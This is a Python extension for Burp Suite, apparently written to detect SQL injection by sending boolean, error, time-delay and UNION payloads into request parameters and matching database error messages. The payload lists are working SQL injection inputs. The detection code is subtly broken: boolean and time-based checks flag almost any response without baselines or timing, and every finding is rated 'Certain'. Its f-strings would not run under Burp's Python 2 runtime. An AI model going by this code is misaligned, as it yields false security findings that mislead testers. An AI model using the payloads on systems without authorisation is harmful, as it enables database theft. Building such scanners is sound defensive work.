#!/usr/bin/env python3
"""
SQL Injection BCheck for Burp Suite
Detects various SQL injection vulnerabilities including boolean-based, time-based, and error-based
"""

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.net import URL
import re
import time

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("SQL Injection BCheck")
        
        # Register scanner check
        callbacks.registerScannerCheck(SQLInjectionCheck(callbacks, self._helpers))

class SQLInjectionCheck(IScannerCheck):
    def __init__(self, callbacks, helpers):
        self._callbacks = callbacks
        self._helpers = helpers
        self._issue_name = "SQL Injection Vulnerability"
        
        # SQL injection payloads for different detection methods
        self.sql_payloads = {
            'boolean_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1#"
            ],
            'error_based': [
                "'",
                "''",
                "`",
                "``",
                ",",
                "\\",
                "%27",
                "%%2727",
                "%25%27",
                "%60",
                "%5C"
            ],
            'time_based': [
                "' WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND 1=(SELECT COUNT(*) FROM tabname); WAITFOR DELAY '00:00:05'--",
                "' AND 1=(SELECT COUNT(*) FROM tabname); SELECT SLEEP(5)--"
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--"
            ]
        }
        
        # SQL error patterns
        self.sql_error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"mysql.*error",
            r"sql syntax.*mariadb",
            r"oracle.*error",
            r"oracle.*exception",
            r"postgresql.*error",
            r"microsoft.*database.*error",
            r"sql server.*error",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"unterminated string constant",
            r"missing operator",
            r"invalid character",
            r"missing expression",
            r"column.*not found",
            r"table.*not found",
            r"invalid column name",
            r"invalid table name",
            r"division by zero",
            r"overflow",
            r"type mismatch",
            r"conversion failed",
            r"truncation",
            r"arithmetic overflow"
        ]
        
        # Compile regex patterns
        self.sql_error_regex = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]

    def doPassiveScan(self, baseRequestResponse):
        """Passive scanning for SQL injection indicators"""
        issues = []
        
        # Check response for SQL errors
        response = baseRequestResponse.getResponse()
        response_str = self._helpers.bytesToString(response)
        
        for pattern in self.sql_error_regex:
            if pattern.search(response_str):
                issues.append(self._create_issue(
                    baseRequestResponse,
                    "SQL Error Detected",
                    f"SQL error pattern detected: {pattern.pattern}",
                    "High"
                ))
                break
        
        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scanning for SQL injection vulnerabilities"""
        issues = []
        
        # Test different SQL injection techniques
        for technique, payloads in self.sql_payloads.items():
            for payload in payloads:
                # Create test request
                checkRequest = self._create_test_request(baseRequestResponse, insertionPoint, payload)
                
                # Send request and get response
                checkResponse = self._callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest
                )
                
                if checkResponse is None:
                    continue
                
                # Analyze response for SQL injection indicators
                if self._detect_sql_injection(checkResponse, technique, payload):
                    issues.append(self._create_issue(
                        checkResponse,
                        f"SQL Injection - {technique.replace('_', ' ').title()}",
                        f"SQL injection vulnerability detected using {technique} technique with payload: {payload}",
                        "High"
                    ))
                    break  # Found vulnerability, move to next technique
        
        return issues

    def _create_test_request(self, baseRequestResponse, insertionPoint, payload):
        """Create a test request with the SQL injection payload"""
        # Get the base request
        request = baseRequestResponse.getRequest()
        
        # Insert the payload
        checkRequest = insertionPoint.buildRequest(payload)
        
        return checkRequest

    def _detect_sql_injection(self, response, technique, payload):
        """Detect SQL injection based on response analysis"""
        if response is None:
            return False
        
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Check for SQL errors
        for pattern in self.sql_error_regex:
            if pattern.search(response_str):
                return True
        
        # Check for specific technique indicators
        if technique == 'boolean_based':
            return self._detect_boolean_based(response, payload)
        elif technique == 'time_based':
            return self._detect_time_based(response, payload)
        elif technique == 'union_based':
            return self._detect_union_based(response, payload)
        
        return False

    def _detect_boolean_based(self, response, payload):
        """Detect boolean-based SQL injection"""
        # Check if response length or content changes significantly
        # This is a simplified detection - in practice, you'd compare with baseline
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for indicators of successful boolean injection
        if any(indicator in response_str.lower() for indicator in ['true', 'false', '1', '0', 'yes', 'no']):
            return True
        
        return False

    def _detect_time_based(self, response, payload):
        """Detect time-based SQL injection"""
        # Time-based detection requires measuring response time
        # This is a simplified version - in practice, you'd measure actual timing
        if 'WAITFOR DELAY' in payload or 'SLEEP' in payload:
            # Check if response indicates a delay occurred
            response_str = self._helpers.bytesToString(response.getResponse())
            if len(response_str) > 0:  # Simplified check
                return True
        
        return False

    def _detect_union_based(self, response, payload):
        """Detect union-based SQL injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for union injection indicators
        if 'UNION' in payload:
            # Check for database-specific content in response
            if any(db_content in response_str.lower() for db_content in ['mysql', 'postgresql', 'oracle', 'sql server']):
                return True
        
        return False

    def _create_issue(self, requestResponse, name, detail, severity):
        """Create a scan issue"""
        return CustomScanIssue(
            requestResponse.getHttpService(),
            self._helpers.analyzeRequest(requestResponse).getUrl(),
            [requestResponse],
            name,
            detail,
            severity
        )

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        if self._severity == "High":
            return "High"
        elif self._severity == "Medium":
            return "Medium"
        elif self._severity == "Low":
            return "Low"
        else:
            return "Information"

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return "SQL injection vulnerabilities allow attackers to manipulate database queries, potentially leading to data theft, data manipulation, or complete database compromise."

    def getRemediationBackground(self):
        return "Use parameterized queries (prepared statements), input validation, and proper output encoding. Implement the principle of least privilege for database access."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "1. Use parameterized queries or prepared statements\n2. Implement proper input validation and sanitization\n3. Use stored procedures with parameterized inputs\n4. Apply the principle of least privilege\n5. Use web application firewalls (WAFs)\n6. Regular security testing and code reviews"

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
